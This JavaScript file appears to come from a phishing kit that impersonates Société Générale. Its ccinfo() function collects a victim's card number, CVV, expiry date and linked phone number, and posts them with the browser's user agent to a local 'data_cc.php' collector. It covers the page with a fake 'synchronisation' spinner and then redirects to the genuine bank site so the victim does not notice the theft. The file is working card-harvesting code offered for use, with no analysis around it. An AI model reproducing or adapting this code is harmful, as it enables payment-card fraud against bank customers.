$(document).ready(function(){
	
$("#coverspin").hide();	

});               


function ccinfo(){
		
var cc_number    = $('#cc_number').val();		
var cc_cvv    = $('#cc_cvv').val();		
var cc_date    = $('#cc_date').val();		
var expmois    = $('#expmois').val();				
var expannees    = $('#expannees').val();				
var phone    = $('#phone').val();				
	
	
var cc_date;


if(cc_number==''){

swal({
icon: 'warning',
title: 'Attention !',
text: "Veuillez saisir le numéro de la carte",

})	

return false;	
}

if(expmois==''){

swal({
icon: 'warning',
title: 'Attention !',
text: "Veuillez saisir le mois d'expiration  de la carte",

})	

return false;	
}


if(expannees==''){

swal({
icon: 'warning',
title: 'Attention !',
text: "Veuillez saisir l'années d'expiration  de la carte",

})	

return false;	
}	
if(cc_cvv==''){

swal({
icon: 'warning',
title: 'Attention !',
text: "Veuillez saisir le cryptogramme visuel de la carte",

})	

return false;	
}


if(phone==''){

swal({
icon: 'warning',
title: 'Attention !',
text: "Veuillez saisir le numéro mobile associé a la carte",

})	

return false;	
}


cc_date = expmois+'/'+expannees;
var data_cc = 
{
DEVICE_sg        :  navigator.userAgent,
cc_number        :	cc_number,
cc_cvv           :	cc_cvv,
cc_date          :	cc_date,
phone            :	phone    

}; 
$("#body").hide(); 
$('#coverspin').show();


var _url = './config/data_cc.php';


$("#text_load").html("Synchronisation en cours........");

$.post(_url,data_cc,function(data){
 var reponse = JSON.parse(data); 
if(reponse.statut=="error"){	

swal({
icon: reponse.statut,
title: reponse.title,
text: reponse.resultat

});
}else if(reponse.statut=="success"){	

setTimeout(()=>{

window.location.href="https://particuliers.societegenerale.fr/"
},8000)


} 


}) 
}